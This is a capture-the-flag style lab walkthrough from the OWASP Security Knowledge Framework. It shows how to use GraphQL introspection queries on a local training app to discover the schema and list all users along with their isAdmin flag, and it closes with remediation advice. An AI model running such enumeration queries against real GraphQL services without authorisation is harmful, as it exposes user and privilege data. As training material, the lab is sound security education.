# GraphQL Introspection

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:graphql-info-introspection
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:graphql-info-introspection
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

As soon as we browse on `http://0.0.0.0:5000` we see the few posts published by 2 users

![](../../.gitbook/assets/python/Graphql-Introspection/1.png)

## Exploitation

We want to use the introspection feature (enabled) in this case, to understand more about what queries are supported.

Let' use the `GraphiQL` UI to send queries to the backend and discover what is available.

Go to `http://0.0.0.0:5000/graphql`. We can query the generic `__schema` using:

```
{
  __schema {
    types {
      name
    }
  }
}
```

![](../../.gitbook/assets/python/Graphql-Introspection/2.png)

The application gives us interesting `Types`. Let's explore the `UserObject` one. If we build a more complex query we can ask for more information, exploring every field available. Let's send the following:

```
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
        ofType {
          name
          kind
        }
      }
    }
  }
}
```

![](../../.gitbook/assets/python/Graphql-Introspection/3.png)

In this case, for each field we we want to know what are the subfields and of which type.

The application will answer with:

```javascript
{
  "data": {
    "__type": {
      "name": "UserObject",
      "fields": [
        {
          "name": "uuid",
          "type": {
            "name": null,
            "kind": "NON_NULL",
            "ofType": {
              "name": "ID",
              "kind": "SCALAR"
            }
          }
        },
        {
          "name": "username",
          "type": {
            "name": "String",
            "kind": "SCALAR",
            "ofType": null
          }
        },
        {
          "name": "isAdmin",
          "type": {
            "name": "Boolean",
            "kind": "SCALAR",
            "ofType": null
          }
        },
        {
          "name": "posts",
          "type": {
            "name": "PostObjectConnection",
            "kind": "OBJECT",
            "ofType": null
          }
        },
        {
          "name": "id",
          "type": {
            "name": null,
            "kind": "NON_NULL",
            "ofType": {
              "name": "ID",
              "kind": "SCALAR"
            }
          }
        }
      ]
    }
  }
}
```

> BINGO! We have some good information here

We can see that there is an interesting field `isAdmin`, that we can use to find out who is the admin of the application.

Now we just need to query all the Users. To do that, let's see if there is a query available. We can use the following syntax:

```
query availableQueries {
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

![](../../.gitbook/assets/python/Graphql-Introspection/4.png)

That will give us the `allUsers` query. Now we need to understand what are the fields. We can do that in different ways, using GraphiQL or doing some more introspection. In this case we use GraphiQL, sending the following query:

```
{
  allUsers {
    edges {
      node {
        username
        isAdmin
      }
    }
  }
}
```

![](../../.gitbook/assets/python/Graphql-Introspection/5.png)

## Remediation

Implement authorization on graphql endpoint. Although authenticated users could query the information, you should not map sensitive information into the type defined into the schema.

## Additional resources
